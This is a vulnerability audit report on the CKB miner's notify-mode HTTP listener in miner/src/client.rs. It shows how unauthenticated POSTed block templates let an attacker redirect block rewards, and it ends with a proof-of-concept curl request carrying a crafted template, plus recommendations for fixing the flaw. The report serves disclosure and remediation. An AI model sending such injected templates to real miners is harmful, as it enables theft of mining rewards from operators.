Audit Report

## Title
Unauthenticated Block Template Injection via Miner Notify HTTP Endpoint - (File: `miner/src/client.rs`)

## Summary
The CKB miner's notify-mode HTTP listener accepts `BlockTemplate` payloads from any source without authentication, source-IP restriction, or chain-state validation. An attacker who can reach the miner's listen address can POST a crafted template whose `cellbase` outputs point to the attacker's lock script; the miner will solve the PoW and submit a valid block that pays the block reward to the attacker.

## Finding Description
When `config.listen` is set, `spawn_background` (L204–232) starts `listen_block_template_notify`, which binds a raw TCP listener and dispatches every accepted connection to the free function `handle` (L358–369):

```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();
    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }
    Ok(Response::new(Empty::new()))
}
```

There is no `Authorization` header check, no IP allowlist, and no HMAC/token verification. Any well-formed JSON body that deserializes as `BlockTemplate` is forwarded directly to `update_block_template` (L293–312):

```rust
fn update_block_template(&self, block_template: BlockTemplate) {
    let work_id = block_template.work_id.into();
    let updated = |id| {
        if id != work_id || id == 0 {
            Some(work_id)
        } else {
            None
        }
    };
    if self.current_work_id
        .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
        .is_ok()
    { ... dispatch to workers ... }
}
```

The `fetch_update` closure accepts the incoming template whenever the current stored `work_id` is 0 (initial state, `id == 0` branch) **or** whenever the incoming `work_id` differs from the current stored value (`id != work_id` branch). Because `current_work_id` is initialized to 0 (L163), every template is accepted unconditionally at startup. After the first legitimate template is processed, the attacker only needs to send any `work_id ≠ current` — e.g., `work_id = 0` always satisfies `id != work_id` once the legitimate node has advanced the counter, and `work_id = current+1` always works. The guard is a deduplication hint, not a security boundary.

`BlockTemplate` (util/jsonrpc-types/src/block_template.rs L13–98) contains `cellbase: CellbaseTemplate` and `transactions: Vec<TransactionTemplate>` — the exact fields that determine who receives the block reward and which transactions are committed. The miner converts the template to `Work` and dispatches it to PoW workers verbatim; no field is cross-checked against the trusted RPC node.

## Impact Explanation
A successful injection causes the miner to solve a valid PoW puzzle over an attacker-controlled block. The CKB node validates the PoW and commits the block; the block reward (primary + secondary issuance) is paid to the attacker's lock script. At mining-pool scale — where notify mode is the standard deployment pattern — an attacker who can reach multiple miners' notify ports can continuously siphon block rewards, constituting concrete, repeatable damage to the CKB mining economy. This matches the allowed impact class: **Critical — Vulnerabilities which could easily damage CKB economy**.

## Likelihood Explanation
- Notify mode is a documented, production-supported feature explicitly designed for multi-machine deployments where the miner binds to a non-loopback address.
- The CKB documentation (logged at startup, L208–221) instructs operators to expose the endpoint to the node, making it reachable from the network in standard pool setups.
- The exploit requires only a single HTTP POST with a valid JSON body — no credentials, no prior state, no cryptographic material.
- The `work_id` bypass is unconditional at startup and trivially achievable at any time by sending any value other than the current counter.
- Even loopback-bound deployments are reachable by any co-located process (compromised dependency, shared hosting, container escape).

## Recommendation
**Short term:** Add a configurable shared-secret bearer token to `MinerClientConfig`. In `handle`, reject any request whose `Authorization` header does not match the configured token before deserializing the body.

**Long term:** After accepting a notify template, cross-check `parent_hash` and `compact_target` against values independently fetched from the trusted RPC node (`get_block_template` / `get_tip_header`). Treat all data arriving on the notify port as untrusted input.

## Proof of Concept
With the miner configured as `listen = "0.0.0.0:8888"`:

```bash
# At miner startup current_work_id == 0, so id == 0 branch fires unconditionally.
# After first legitimate template, send work_id != current (e.g. 0 always differs once counter > 0).
curl -X POST http://<miner-ip>:8888 \
  -H "Content-Type: application/json" \
  -d '{
    "version": "0x0",
    "compact_target": "0x1e083126",
    "current_time": "0x174c45e17a3",
    "number": "0x401",
    "epoch": "0x7080019000001",
    "parent_hash": "<current tip hash from node>",
    "cycles_limit": "0xd09dc300",
    "bytes_limit": "0x91c08",
    "uncles_count_limit": "0x2",
    "uncles": [], "transactions": [], "proposals": [],
    "cellbase": {
      "cycles": null,
      "data": { "<cellbase tx with outputs locked to attacker address>" },
      "hash": "<matching hash>"
    },
    "work_id": "0x0",
    "dao": "0xd495a106684401001e47c0ae1d5930009449d26e32380000000721efd0030000"
  }'
```

The miner accepts the template (startup: `id == 0`; later: `id != work_id`), mines it, and calls `submit_block` with the attacker-controlled block. The node verifies PoW and commits the block; the block reward is paid to the attacker's lock script.